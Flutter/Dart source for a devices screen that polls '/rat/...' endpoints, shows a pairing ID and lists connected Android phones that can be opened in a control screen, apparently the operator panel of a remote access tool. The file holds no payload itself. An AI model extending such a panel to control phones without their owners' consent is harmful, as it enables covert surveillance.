import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import '../theme.dart';
import '../api.dart';
import 'control.dart';

class DevicesScreen extends StatefulWidget {
  const DevicesScreen({super.key});

  @override
  State<DevicesScreen> createState() => _DevicesScreenState();
}

class _DevicesScreenState extends State<DevicesScreen> {
  List<dynamic> _list = [];
  String _pair = '';
  bool _loading = true;
  String? _err;
  Timer? _t;

  @override
  void initState() {
    super.initState();
    _load();
    _t = Timer.periodic(const Duration(seconds: 10), (_) => _load());
  }

  @override
  void dispose() {
    _t?.cancel();
    super.dispose();
  }

  Future<void> _load() async {
    try {
      final p = await Api.get('/rat/pairid');
      final d = await Api.get('/rat/my-devices');
      if (!mounted) return;
      setState(() {
        _pair = (p['pairId'] ?? '').toString();
        _list = List<dynamic>.from(d['devices'] ?? []);
        _err = null;
        _loading = false;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _err = e.toString();
        _loading = false;
      });
    }
  }

  void _copyPair() {
    if (_pair.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pair));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('PairID disalin')),
    );
  }

  int get _online => _list.where((d) => d['online'] == true).length;

  Widget _pairBox() {
    return GestureDetector(
      onTap: _copyPair,
      child: Container(
        margin: const EdgeInsets.fromLTRB(16, 14, 16, 0),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: T.card,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: T.red.withOpacity(0.4), width: 1.4),
        ),
        child: Row(
          children: [
            const Icon(Icons.link_rounded, color: T.red, size: 22),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'PAIRID',
                    style: TextStyle(
                      fontFamily: T.mono,
                      color: T.red,
                      fontSize: 10,
                      letterSpacing: 2,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    _pair.isEmpty ? '—' : _pair,
                    style: const TextStyle(
                      fontFamily: T.mono,
                      color: T.white,
                      fontSize: 15,
                      letterSpacing: 2,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            const Icon(Icons.copy_rounded, color: T.red, size: 18),
          ],
        ),
      ),
    );
  }

  Widget _card(dynamic d) {
    final on = d['online'] == true;
    final c = on ? T.red : T.faint;

    return GestureDetector(
      onTap: () => Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) => ControlScreen(device: Map<String, dynamic>.from(d)),
        ),
      ),
      child: Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          color: T.card,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: c.withOpacity(on ? 0.4 : 0.15)),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  Icons.phone_android_rounded,
                  color: c,
                  size: 14,
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 2),
                  decoration: BoxDecoration(
                    color: c.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: Text(
                    on ? 'ON' : 'OFF',
                    style: TextStyle(
                      fontFamily: T.mono,
                      color: c,
                      fontSize: 8,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ],
            ),
            const Spacer(),
            Text(
              d['model'] ?? 'Unknown',
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
              style: const TextStyle(
                color: T.white,
                fontSize: 11,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 2),
            Text(
              d['id'] ?? '-',
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
              style: const TextStyle(
                fontFamily: T.mono,
                color: T.dim,
                fontSize: 8,
              ),
            ),
            const Spacer(),
            Row(
              children: [
                const Icon(Icons.battery_full_rounded, color: T.dim, size: 11),
                const SizedBox(width: 4),
                Text(
                  '${d['battery'] ?? '?'}%',
                  style: const TextStyle(
                    fontFamily: T.mono,
                    color: T.dim,
                    fontSize: 9,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: T.bg,
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
              child: Row(
                children: [
                  Text(
                    '$_online / ${_list.length} ONLINE',
                    style: const TextStyle(
                      fontFamily: T.mono,
                      color: T.red,
                      fontSize: 12,
                      letterSpacing: 1.5,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: () {
                      setState(() => _loading = true);
                      _load();
                    },
                    child: const Icon(Icons.refresh_rounded, color: T.red, size: 20),
                  ),
                ],
              ),
            ),
            _pairBox(),
            if (_err != null)
              Padding(
                padding: const EdgeInsets.all(16),
                child: Text(
                  _err!,
                  style: const TextStyle(color: T.red, fontSize: 11),
                ),
              ),
            Expanded(
              child: _loading
                  ? const Center(
                      child: CircularProgressIndicator(
                        color: T.red,
                        strokeWidth: 2,
                      ),
                    )
                  : _list.isEmpty
                      ? const Center(
                          child: Text(
                            'Belum ada device terhubung',
                            style: TextStyle(
                              fontFamily: T.mono,
                              color: T.dim,
                              fontSize: 12,
                            ),
                          ),
                        )
                      : GridView.builder(
                          padding: const EdgeInsets.all(16),
                          gridDelegate:
                              const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3,
                            crossAxisSpacing: 10,
                            mainAxisSpacing: 10,
                            childAspectRatio: 0.7,
                          ),
                          itemCount: _list.length,
                          itemBuilder: (_, i) => _card(_list[i]),
                        ),
            ),
          ],
        ),
      ),
    );
  }
}
